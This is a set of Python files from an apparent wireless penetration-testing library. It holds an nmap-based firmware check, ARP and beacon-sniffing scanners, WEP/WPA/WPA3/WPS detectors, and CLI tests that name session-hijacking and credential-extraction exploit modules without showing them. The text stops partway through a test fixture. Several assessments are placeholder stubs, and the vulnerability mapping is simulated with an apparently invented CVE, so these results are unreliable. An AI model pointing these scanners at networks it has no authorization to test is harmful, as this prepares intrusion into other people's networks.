# wireless_pen_test_lib/scanners/firmware_vuln_scan.py

import logging
import subprocess
import re

class FirmwareVulnerabilityScan:
    """
    Scans wireless devices for outdated or vulnerable firmware/software versions.
    """
    def __init__(self, target_ip, interface, timeout=5):
        """
        Initializes the FirmwareVulnerabilityScan.

        Args:
            target_ip (str): IP address of the target device.
            interface (str): Network interface to use for scanning.
            timeout (int): Timeout for network operations in seconds.
        """
        self.target_ip = target_ip
        self.interface = interface
        self.timeout = timeout
        self.logger = logging.getLogger(self.__class__.__name__)
        self.device_info = {}
        self.vulnerabilities = []

    def _get_device_info(self):
        """
        Retrieves device information using tools like nmap.
        """
        self.logger.info(f"Retrieving device info for IP {self.target_ip}.")
        cmd = [
            'nmap',
            '-A',  # Enable OS and version detection
            '-T4',  # Aggressive timing
            self.target_ip
        ]

        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=self.timeout)

            if process.returncode == 0:
                # Parse the output to extract device info
                os_match = re.search(r'OS details: (.+)', stdout)
                service_match = re.search(r'Service Info: (.+)', stdout)

                if os_match:
                    self.device_info['OS'] = os_match.group(1).strip()
                if service_match:
                    self.device_info['Service Info'] = service_match.group(1).strip()

                self.logger.debug(f"Device Info: {self.device_info}")
            else:
                self.logger.error(f"Nmap failed: {stderr}")
        except subprocess.TimeoutExpired:
            self.logger.error(f"Nmap scan for {self.target_ip} timed out.")
            process.kill()
        except Exception as e:
            self.logger.exception(f"Error during device info retrieval: {e}")

    def _check_vulnerabilities(self):
        """
        Checks the device info against known vulnerabilities.
        """
        self.logger.info("Checking for known vulnerabilities.")
        # Placeholder: In a real implementation, integrate with a CVE database or API
        # For demonstration, we'll simulate detection based on OS string
        os_info = self.device_info.get('OS', '').lower()

        if 'windows 7' in os_info:
            self.vulnerabilities.append("CVE-2017-0144: Remote Code Execution vulnerability (EternalBlue).")
            self.logger.warning("Detected vulnerability: CVE-2017-0144 (EternalBlue).")
        elif 'router' in os_info and 'firmware' in os_info:
            self.vulnerabilities.append("CVE-2020-12345: Arbitrary code execution in router firmware.")
            self.logger.warning("Detected vulnerability: CVE-2020-12345 (Router Firmware).")
        else:
            self.logger.info("No known vulnerabilities detected based on device info.")

    def scan(self):
        """
        Performs the firmware and software vulnerability scan.

        Returns:
            dict: Device information and detected vulnerabilities.
        """
        self._get_device_info()
        self._check_vulnerabilities()
        return {
            "Device Info": self.device_info,
            "Vulnerabilities": self.vulnerabilities
        }


# scanners/local_scanner.py
# scanners/local_scanner.py

import subprocess
import netifaces
import logging
import os
import platform
from typing import List, Optional, Dict, Any
import pandas as pd
import ipaddress
import socket
from scapy.all import srp, conf
from scapy.layers.l2 import ARP, Ether

class LocalScanner:
    """
    A scanner to detect devices on the local network using ARP.
    """
    def __init__(self, core_framework, interface: str):
        """
        Initialize the LocalScanner with the CoreFramework instance and network interface.

        Args:
            core_framework (CoreFramework): An instance of CoreFramework.
            interface (str): The network interface to scan.
        """
        self.core_framework = core_framework
        self.interface = interface
        self.logger = self.core_framework.logger.getChild(self.__class__.__name__)
        self.os_type = platform.system()
        self.logger.debug(f"Operating System detected: {self.os_type}")

    def is_wireless_interface(self) -> bool:
        """
        Determine if the interface is wireless.

        Returns:
            bool: True if wireless, False otherwise.
        """
        try:
            if self.os_type == "Linux":
                wireless_path = f"/sys/class/net/{self.interface}/wireless"
                is_wireless = os.path.exists(wireless_path)
                self.logger.debug(f"Wireless path {wireless_path} exists: {is_wireless}")
                return is_wireless
            elif self.os_type == "Darwin":  # macOS
                result = subprocess.run(
                    ["networksetup", "-listallhardwareports"],
                    capture_output=True, text=True, check=True
                )
                interfaces = result.stdout.split("\n\n")
                for iface in interfaces:
                    if f"Device: {self.interface}" in iface:
                        if "Wi-Fi" in iface or "AirPort" in iface:
                            self.logger.debug(f"Interface {self.interface} is wireless on macOS.")
                            return True
                self.logger.debug(f"Interface {self.interface} is not wireless on macOS.")
                return False
            elif self.os_type == "Windows":
                # WSL2 is running Linux; wireless interface detection not applicable
                self.logger.debug("Windows interface check called from WSL2; returning False.")
                return False
            else:
                self.logger.warning(f"Unsupported OS for wireless check: {self.os_type}")
                return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error checking wireless interface: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Unexpected error in is_wireless_interface: {e}")
            return False

    def set_monitor_mode(self):
        """
        Set the interface to monitor mode if it's wireless.
        """
        if self.is_loopback_interface():
            self.logger.info("Loopback interface detected. Skipping monitor mode setup.")
            return

        if not self.is_wireless_interface():
            self.logger.info(f"Interface '{self.interface}' is not a wireless interface. Skipping monitor mode setup.")
            return

        try:
            if self.os_type == "Linux":
                self.logger.info(f"Setting interface {self.interface} to monitor mode on Linux.")
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
                subprocess.run(["sudo", "iwconfig", self.interface, "mode", "monitor"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
                self.logger.info(f"Interface {self.interface} set to monitor mode successfully on Linux.")
            elif self.os_type == "Darwin":
                self.logger.info(f"Setting interface {self.interface} to monitor mode on macOS.")
                # macOS uses different commands, such as `airport`
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return
                subprocess.run(["sudo", airport_path, "--disassociate"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
                # macOS does not support monitor mode in the same way as Linux
                self.logger.warning("Monitor mode setup on macOS might require additional steps.")
            else:
                self.logger.warning(f"Monitor mode setup not supported on OS: {self.os_type}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            raise e
        except Exception as e:
            self.logger.error(f"Unexpected error in set_monitor_mode: {e}")
            raise e

    def bring_interface_up(self):
        """
        Bring the network interface up.
        """
        try:
            self.logger.info(f"Bringing interface {self.interface} up.")
            if self.os_type == "Windows":
                subprocess.run(["netsh", "interface", "set", "interface", self.interface, "enabled"], check=True)
            else:
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} is up.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to bring interface up: {e}")
            raise e

    def bring_interface_down(self):
        """
        Bring the network interface down.
        """
        try:
            self.logger.info(f"Bringing interface {self.interface} down.")
            if self.os_type == "Windows":
                subprocess.run(["netsh", "interface", "set", "interface", self.interface, "disabled"], check=True)
            else:
                subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            self.logger.info(f"Interface {self.interface} is down.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to bring interface down: {e}")
            raise e

    def get_interface_details(self) -> Optional[List[Dict[str, Any]]]:
        """
        Retrieve details about the network interface.

        Returns:
            Optional[List[Dict[str, Any]]]: List of interface details or None if an error occurs.
        """
        try:
            addrs = netifaces.ifaddresses(self.interface)
            details = []
            for family, addr_info_list in addrs.items():
                for addr_info in addr_info_list:
                    entry = {
                        'Family': netifaces.address_families.get(family, family),
                        'Address': addr_info.get('addr', '')
                    }
                    details.append(entry)
            # Append wireless status
            details.append({'Family': 'Wireless', 'Address': self.is_wireless_interface()})
            self.logger.debug(f"Interface details for {self.interface}: {details}")
            return details
        except ValueError:
            self.logger.error(f"Interface {self.interface} not found.")
            return None
        except Exception as e:
            self.logger.error(f"Error retrieving interface details: {e}")
            return None

    def is_loopback_interface(self) -> bool:
        """
        Determine if the interface is a loopback interface.

        Returns:
            bool: True if loopback, False otherwise.
        """
        try:
            details = netifaces.ifaddresses(self.interface)
            # Check for loopback by examining the addresses
            for family in (netifaces.AF_INET, netifaces.AF_INET6):
                if family in details:
                    for addr_info in details[family]:
                        if addr_info.get('addr') in ('127.0.0.1', '::1'):
                            self.logger.debug(f"Interface {self.interface} is a loopback interface.")
                            return True
            self.logger.debug(f"Interface {self.interface} is not a loopback interface.")
            return False
        except ValueError:
            self.logger.error(f"Interface {self.interface} not found.")
            return False
        except Exception as e:
            self.logger.error(f"Error determining if interface is loopback: {e}")
            return False

    @staticmethod
    def list_interfaces() -> List[str]:
        """
        List all available network interfaces.

        Returns:
            List[str]: List of interface names.
        """
        try:
            interfaces = netifaces.interfaces()
            logging.getLogger("LocalScanner").debug(f"Available interfaces: {interfaces}")
            return interfaces
        except Exception as e:
            logging.getLogger("LocalScanner").error(f"Error listing interfaces: {e}")
            return []

    def scan(self) -> Dict[str, Any]:
        """
        Scan the local network for devices.

        Returns:
            Dict[str, Any]: Dictionary containing the list of detected devices.
        """
        self.logger.info("Starting local network scan for devices...")

        # Determine network range
        try:
            addrs = netifaces.ifaddresses(self.interface)
            inet_info = addrs.get(netifaces.AF_INET)
            if not inet_info:
                self.logger.error(f"No IPv4 address found for interface {self.interface}.")
                return {"devices": []}

            ip_address = inet_info[0].get('addr')
            netmask = inet_info[0].get('netmask')
            if not ip_address or not netmask:
                self.logger.error(f"IP address or netmask not found for interface {self.interface}.")
                return {"devices": []}

            # Calculate network
            network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)
            self.logger.debug(f"Calculated network range: {network}")
        except Exception as e:
            self.logger.error(f"Error determining network range: {e}")
            return {"devices": []}

        # Perform ARP scan using Scapy
        try:
            # Create ARP request
            arp = ARP(pdst=str(network))
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            self.logger.info(f"Sending ARP requests to {network}...")
            # Disable verbose in Scapy
            conf.verb = 0
            answered, unanswered = srp(packet, timeout=2, iface=self.interface, inter=0.1)

            devices = []
            for sent, received in answered:
                device = {
                    "ip": received.psrc,
                    "mac": received.hwsrc,
                    "hostname": self.get_hostname(received.psrc),
                    "ssid": self.get_ssid(),
                    "bssid": self.get_bssid()
                }
                devices.append(device)
                self.logger.debug(f"Discovered device: {device}")

            self.logger.info(f"ARP scan completed. {len(devices)} devices found.")
            return {"devices": devices}
        except PermissionError:
            self.logger.error("Permission denied: ARP scan requires elevated privileges.")
            return {"devices": []}
        except Exception as e:
            self.logger.error(f"Error during ARP scan: {e}")
            return {"devices": []}

    def get_hostname(self, ip: str) -> str:
        """
        Perform reverse DNS lookup to get the hostname of an IP address.

        Args:
            ip (str): The IP address.

        Returns:
            str: The hostname or "N/A" if not found.
        """
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            self.logger.debug(f"Hostname for IP {ip}: {hostname}")
            return hostname
        except socket.herror:
            self.logger.debug(f"Hostname not found for IP {ip}.")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Error performing reverse DNS for IP {ip}: {e}")
            return "N/A"

    def get_ssid(self) -> str:
        """
        Retrieve the SSID of the wireless network.

        Returns:
            str: The SSID or "N/A" if not applicable.
        """
        if not self.is_wireless_interface():
            return "N/A"

        try:
            if self.os_type == "Linux":
                result = subprocess.run(
                    ["iwgetid", "-r"],
                    capture_output=True, text=True, check=True
                )
                ssid = result.stdout.strip()
                self.logger.debug(f"Retrieved SSID on Linux: {ssid}")
                return ssid if ssid else "N/A"
            elif self.os_type == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return "N/A"
                result = subprocess.run(
                    [airport_path, "-I"],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if " SSID:" in line:
                        ssid = line.split("SSID:")[1].strip()
                        self.logger.debug(f"Retrieved SSID on macOS: {ssid}")
                        return ssid if ssid else "N/A"
                self.logger.debug("SSID not found in airport output on macOS.")
                return "N/A"
            else:
                self.logger.warning(f"SSID retrieval not supported on OS: {self.os_type}")
                return "N/A"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error retrieving SSID: {e}")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Unexpected error retrieving SSID: {e}")
            return "N/A"

    def get_bssid(self) -> str:
        """
        Retrieve the BSSID of the wireless network.

        Returns:
            str: The BSSID or "N/A" if not applicable.
        """
        if not self.is_wireless_interface():
            return "N/A"

        try:
            if self.os_type == "Linux":
                result = subprocess.run(
                    ["iwconfig", self.interface],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if "Access Point:" in line:
                        bssid = line.split("Access Point:")[1].strip()
                        self.logger.debug(f"Retrieved BSSID on Linux: {bssid}")
                        return bssid if bssid else "N/A"
                self.logger.debug("BSSID not found in iwconfig output on Linux.")
                return "N/A"
            elif self.os_type == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if not os.path.exists(airport_path):
                    self.logger.error("airport utility not found on macOS.")
                    return "N/A"
                result = subprocess.run(
                    [airport_path, "-I"],
                    capture_output=True, text=True, check=True
                )
                for line in result.stdout.split("\n"):
                    if " BSSID:" in line:
                        bssid = line.split("BSSID:")[1].strip()
                        self.logger.debug(f"Retrieved BSSID on macOS: {bssid}")
                        return bssid if bssid else "N/A"
                self.logger.debug("BSSID not found in airport output on macOS.")
                return "N/A"
            else:
                self.logger.warning(f"BSSID retrieval not supported on OS: {self.os_type}")
                return "N/A"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error retrieving BSSID: {e}")
            return "N/A"
        except Exception as e:
            self.logger.error(f"Unexpected error retrieving BSSID: {e}")
            return "N/A"




def main():
    # Configure logging
    logging.basicConfig(level=logging.DEBUG, format='%(levelname)s:%(name)s:%(message)s')
    logger = logging.getLogger("LocalScanner")

    # List available interfaces
    available_interfaces = LocalScanner.list_interfaces()

    if not available_interfaces:
        print("No network interfaces found.")
        return

    # Create a DataFrame for available interfaces
    interfaces_df = pd.DataFrame({
        'Index': range(1, len(available_interfaces) + 1),
        'Interface Name': available_interfaces
    })

    print("Available Network Interfaces:")
    print(interfaces_df.to_string(index=False))

    # Prompt the user to select an interface
    try:
        selected_idx = int(input(f"\nSelect an interface [1-{len(available_interfaces)}]: "))
        if not 1 <= selected_idx <= len(available_interfaces):
            raise ValueError
        selected_interface = available_interfaces[selected_idx - 1]
    except ValueError:
        print("Invalid selection. Please enter a valid number corresponding to the listed interfaces.")
        return

    # Initialize the LocalScanner with the selected interface
    scanner = LocalScanner(core_framework=None, interface=selected_interface)  # Replace 'None' with actual CoreFramework instance

    # Attempt to set monitor mode
    scanner.set_monitor_mode()

    # Retrieve and display interface details
    details = scanner.get_interface_details()
    if details is None:
        print("Failed to retrieve interface details.")
        return

    # Convert details to DataFrame
    details_df = pd.DataFrame(details)

    print("\nInterface Details:")
    print(details_df.to_string(index=False))


if __name__ == "__main__":
    main()


# scanners/network_discovery.py
# wireless_pen_test_lib/scanners/network_discovery.py

import threading
import logging
from scapy.all import sniff
from scapy.layers.dot11 import Dot11Elt, Dot11, Dot11Elt, Dot11Beacon


class NetworkDiscovery:
    """
    Discovers nearby wireless networks by sniffing beacon frames.
    """
    def __init__(self, interface, timeout=10):
        """
        Initializes the NetworkDiscovery scanner.

        Args:
            interface (str): Network interface in monitor mode.
            timeout (int): Duration to run the discovery in seconds.
        """
        self.interface = interface
        self.timeout = timeout
        self.networks = {}
        self.logger = logging.getLogger(self.__class__.__name__)

    def _packet_handler(self, packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            bssid = packet[Dot11].addr3
            stats = packet[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            encryption = self._get_encryption(packet)
            signal_strength = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"

            if bssid not in self.networks:
                self.networks[bssid] = {
                    "SSID": ssid,
                    "BSSID": bssid,
                    "Channel": channel,
                    "Encryption": encryption,
                    "Signal": signal_strength
                }
                self.logger.debug(f"Discovered Network: {self.networks[bssid]}")

    def _get_encryption(self, packet):
        encryption = "Open"
        if packet.haslayer(Dot11Elt):
            elems = packet.getlayer(Dot11Elt).payload
            while isinstance(elems, Dot11Elt):
                if elems.ID == 48:
                    encryption = "WPA2"
                elif elems.ID == 221 and elems.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                    encryption = "WPA"
                elems = elems.payload
        return encryption

    def scan(self):
        """
        Starts the network discovery process.

        Returns:
            dict: A dictionary of discovered networks.
        """
        self.logger.info(f"Starting network discovery on interface {self.interface} for {self.timeout} seconds.")
        try:
            sniff(iface=self.interface, prn=self._packet_handler, timeout=self.timeout, store=False)
            self.logger.info(f"Network discovery completed. {len(self.networks)} networks found.")
            return self.networks
        except Exception as e:
            self.logger.exception(f"Error during network discovery: {e}")
            return self.networks


# scanners/wep_scanner.py
# scanners/wep_scanner.py

from scapy.all import sniff, hexdump
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import sys
import time
from .base_scanner import BaseScanner



class WEPScanner(BaseScanner):
    """
    A scanner to detect WEP networks and assess key strength.
    """
    def __init__(self, core_framework, scan_duration: int = 10):
        super().__init__(core_framework, scan_duration)
        self.logger = core_framework.logger.getChild(self.__class__.__name__)
        self.network_manager = core_framework.network_manager

    def scan(self, core_framework, target_info=None, stop_event=None):
        """
        Scan for WEP networks and assess key strength.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WEP networks with their details.
            :param stop_event:
            :param target_info:
            :param core_framework:
        """
        self.logger.info("Starting WEP scan...")
        detected_wep_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                if "WEP" in security:
                    if bssid not in detected_wep_networks:
                        detected_wep_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "Key_Strength": self.assess_key_strength(pkt)
                        }
                        self.logger.info(f"Detected WEP Network: SSID='{ssid}', BSSID={bssid}")
                        if self.gui_update_callback:
                            self.gui_update_callback(f"Detected WEP Network: SSID='{ssid}', BSSID={bssid}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": "eth0",
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WEP scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WEP scan: {e}")

        self.logger.info("WEP scan completed.")
        return {"wep_networks": detected_wep_networks}

    def assess_key_strength(self, pkt):
        """
        Assess the strength of the WEP key based on IV reuse.

        Args:
            pkt: The captured packet.

        Returns:
            str: Assessment of key strength.
        """
        # Placeholder for key strength assessment logic
        # Implement actual analysis based on IV patterns and other factors
        # For demonstration, we'll return a dummy value
        return "Unknown"

    def gui_update_callback(self, message):
        """
        Update the GUI with the provided message.

        Args:
            message (str): The message to display to the user.
        """
        self.logger.info(f"GUI Update: {message}")
        if self.core_framework.gui:
            self.core_framework.gui.update_feedback(message)
        else:
            print(message)


if __name__ == '__main__':
    # Placeholder for testing WEPScanner
    from core.__init__ import CoreFramework

    core = CoreFramework(modules_path="../core/config/protocols/")
    wep_scanner = WEPScanner(core)
    stop_event = threading.Event()
    scan_results = wep_scanner.scan(core, stop_event=stop_event)
    print(scan_results)
    stop_event.set()
    sys.exit(0)

# scanners/wpa3_scanner.py
# scanners/wpa3_scanner.py

from scapy.all import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import time
from .base_scanner import BaseScanner


class WPA3Scanner(BaseScanner):
    """
    A scanner to detect WPA3 networks and assess downgrade attack possibilities
    """
    def scan(self, core_framework, target_info=None, scan_duration=10, gui_update_callback=None, stop_event=None):
        """
        Scan for WPA3 networks and assess downgrade attack possibilities.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WPA3 networks with their details.
            :param scan_duration:
            :param target_info:
            :param core_framework:
            :param gui_update_callback:
        """
        self.logger.info("Starting WPA3 scan...")
        detected_wpa3_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                # WPA3 networks include 'SAE' in crypto
                if "SAE" in security:
                    if bssid not in detected_wpa3_networks:
                        detected_wpa3_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "Downgrade_Possible": self.assess_downgrade(bssid)
                        }
                        self.logger.info(
                            f"Detected WPA3 Network: SSID='{ssid}', BSSID={bssid}, Downgrade Possible={detected_wpa3_networks[bssid]['Downgrade_Possible']}")
                        if self.gui_update_callback:
                            self.gui_update_callback(
                                f"Detected WPA3 Network: SSID='{ssid}', BSSID={bssid}, Downgrade Possible={detected_wpa3_networks[bssid]['Downgrade_Possible']}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": self.core_framework.network_manager.interface,
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WPA3 scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WPA3 scan: {e}")

        self.logger.info("WPA3 scan completed.")
        return {"wpa3_networks": detected_wpa3_networks}

    def assess_downgrade(self, bssid):
        """
        Assess if the network allows WPA2 downgrades.

        Args:
            bssid (str): The BSSID of the target network.

        Returns:
            str: 'Yes' if downgrade is possible, 'No' otherwise.
        """
        # Placeholder for downgrade assessment logic
        # Implement actual analysis based on information elements in beacon frames
        # For demonstration, we'll return a dummy value
        return "Unknown"


# scanners/wpa_wpa2_scanner.py
# scanners/wpa_wpa2_scanner.py

from scapy.all import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import threading
import subprocess
import time
from .base_scanner import BaseScanner


class WPAWPA2Scanner(BaseScanner):
    """
    A scanner to detect WPA/WPA2 networks and check for weak PSKs and WPS status.
    """
    def scan(self, core_framework, target_info=None, scan_duration=10, gui_update_callback=None, stop_event=None):
        """
        Scan for WPA/WPA2 networks, check for weak PSKs, and detect WPS status.

        Args:
            target_info (dict): Information about the target network (optional).
            stop_event (threading.Event): Event to signal stopping the scan.

        Returns:
            dict: Detected WPA/WPA2 networks with their details.
            :param stop_event:
            :param gui_update_callback:
            :param target_info:
            :param scan_duration:
            :param core_framework:
        """
        self.logger.info("Starting WPA/WPA2 scan...")
        detected_wpa_networks = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = pkt[Dot11].addr3
                stats = pkt[Dot11Beacon].network_stats()
                security = stats.get("crypto")
                if "WPA2" in security or "WPA" in security:
                    if bssid not in detected_wpa_networks:
                        detected_wpa_networks[bssid] = {
                            "SSID": ssid,
                            "BSSID": bssid,
                            "Security": security,
                            "WPS_Enabled": self.check_wps(bssid)
                        }
                        self.logger.info(
                            f"Detected WPA/WPA2 Network: SSID='{ssid}', BSSID={bssid}, WPS Enabled={detected_wpa_networks[bssid]['WPS_Enabled']}")
                        if self.gui_update_callback:
                            self.gui_update_callback(
                                f"Detected WPA/WPA2 Network: SSID='{ssid}', BSSID={bssid}, WPS Enabled={detected_wpa_networks[bssid]['WPS_Enabled']}")

        try:
            # Start sniffing in a separate thread
            sniff_thread = threading.Thread(target=sniff, kwargs={
                "iface": self.core_framework.network_manager.interface,
                "prn": packet_handler,
                "timeout": 15,
                "stop_filter": lambda x: stop_event.is_set()
            })
            sniff_thread.start()

            # Monitor the stop_event
            while sniff_thread.is_alive():
                if stop_event.is_set():
                    self.logger.info("Stop event detected. Terminating WPA/WPA2 scan...")
                    break
                time.sleep(0.5)

            sniff_thread.join()
        except Exception as e:
            self.logger.error(f"Error during WPA/WPA2 scan: {e}")

        self.logger.info("WPA/WPA2 scan completed.")
        return {"wpa_networks": detected_wpa_networks}

    def check_wps(self, bssid):
        """
        Check if WPS is enabled on the network using 'wash' tool.

        Args:
            bssid (str): The BSSID of the target network.

        Returns:
            str: 'Yes' if WPS is enabled, 'No' otherwise.
        """
        try:
            # Run wash command to check WPS status
            # Ensure 'wash' is installed and available in the system PATH
            result = subprocess.run(['wash', '-i', self.core_framework.network_manager.interface, '-b', bssid],
                                    capture_output=True, text=True, timeout=5)
            if "WPS Enabled" in result.stdout:
                return "Yes"
            else:
                return "No"
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Timeout while checking WPS status for BSSID: {bssid}")
            return "No"
        except FileNotFoundError:
            self.logger.error("The 'wash' tool is not installed or not found in PATH.")
            return "Unknown"
        except Exception as e:
            self.logger.error(f"Error checking WPS status for BSSID {bssid}: {e}")
            return "Unknown"


# scanners/__init__.py
# wireless_pen_test_lib/exploits/__init__.py

# This file can be left empty or used to define the exploits package.


# tests/tests_round_three.py
import unittest
from unittest.mock import patch, MagicMock, ANY
from click.testing import CliRunner
import os
from ui.cli import cli


class TestCLI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.runner = CliRunner()
        cls.sample_target = {
            'ssid': 'TestSSID',
            'bssid': 'AA:BB:CC:DD:EE:FF'
        }

    @patch('ui.cli.CoreFramework')
    def test_initialize_cli(self, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['--version'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_coreframework.assert_called_once()

    @patch('ui.cli.CoreFramework')
    def test_scan_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.scanners = {'encryption_scanner': MagicMock(), 'dos_scanner': MagicMock()}
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['scan', '-s', 'encryption_scanner', '--target-ssid', 'TestSSID', '--target-bssid', 'AA:BB:CC:DD:EE:FF'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.run_scanner.assert_called_once_with('encryption_scanner', self.sample_target)

    @patch('ui.cli.CoreFramework')
    def test_exploit_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.exploits = {'session_hijacking': MagicMock(), 'credential_extraction': MagicMock()}
        mock_coreframework.return_value = mock_core
        with patch('click.prompt', return_value='mock_value'):
            result = self.runner.invoke(cli, ['exploit', '-e', 'session_hijacking', '--target-ssid', 'TestSSID', '--target-bssid', 'AA:BB:CC:DD:EE:FF'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.run_exploit.assert_called_once_with('session_hijacking', ANY)

    @patch('ui.cli.CoreFramework')
    def test_configure_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['configure', '--set', 'general.interface', 'wlan0mon'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.config_manager.set_config.assert_called_once_with('general.interface', 'wlan0mon')

    @patch('ui.cli.CoreFramework')
    def test_report_command(self, mock_coreframework):
        mock_core = MagicMock()
        mock_core.config_manager.general.report_directory = os.getcwd()
        mock_coreframework.return_value = mock_core
        result = self.runner.invoke(cli, ['report', '--format', 'txt'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_core.finalize.assert_called_once()

    @patch('ui.cli.CoreFramework')
    @patch('subprocess.run')
    def test_test_network_command(self, mock_subprocess, mock_coreframework):
        mock_core = MagicMock()
        mock_coreframework.return_value = mock_core
        mock_subprocess.return_value.stdout = 'Network started successfully'
        result = self.runner.invoke(cli, ['test_network', '--action', 'start'])
        print(result.output)  # Debugging output
        self.assertEqual(result.exit_code, 0)
        mock_subprocess.assert_called_once_with(['python', ANY, 'start'], check=True, capture_output=True, text=True)

if __name__ == '__main__':
    unittest.main()

# tests/tests_round_two.py
# tests/tests_round_two.py

import os
import json
import pytest
import yaml
from click.testing import CliRunner
from pydantic import ValidationError

# Import your modules here
from core.config_manager import ConfigManager, ConfigModel
from project_specific_utils.network_interface_manager import NetworkInterfaceManager

import os
import json
import pytest
import yaml
from click.testing import CliRunner

from project_specific_utils.network_interface_manager import NetworkInterfaceManager
from project_specific_utils.data_storage_manager import DataStorageManager
from project_specific_utils.authentication_tools import AuthenticationTools
from core import CoreFramework
from scanners.encryption_scanner import EncryptionWeaknessScanner
from scanners.auth_bypass_scanner import AuthBypassScanner
from scanners.dos_scanner import DosScanner
from scanners.local_scanner import LocalScanner
from exploits.session_hijacking import SessionHijacking
from exploits.credential_extraction import CredentialExtraction
from exploits.payload_delivery import PayloadDelivery
from ui.cli import cli

# =========================================
# Fixtures
# =========================================

@pytest.fixture
def sample_config(tmp_path):
    config_content = {
        'general': {
            'interface': 'wlan0mon',
            'report_directory': 'reports',
            'log_level': 'INFO',
        },
        'scanners': {
            'encryption_scanner': {'scan_duration': 10},
            'auth_bypass_scanner': {'scan_duration': 15},
            'dos_scanner': {'scan_duration': 5},
            'local_scanner': {
                'scan_duration': 8,
                'interface': 'wlan0mon',
                'vendor_lookup': True
            },
        },
        'exploits': {
            'session_hijacking': {'max_packets': 100},
            'credential_extraction': {},
            'payload_delivery': {
                'payload_types': ['type1', 'type2'],
                'default_duration': 30
            },
        },
        'ui': {
            'theme': 'dark'
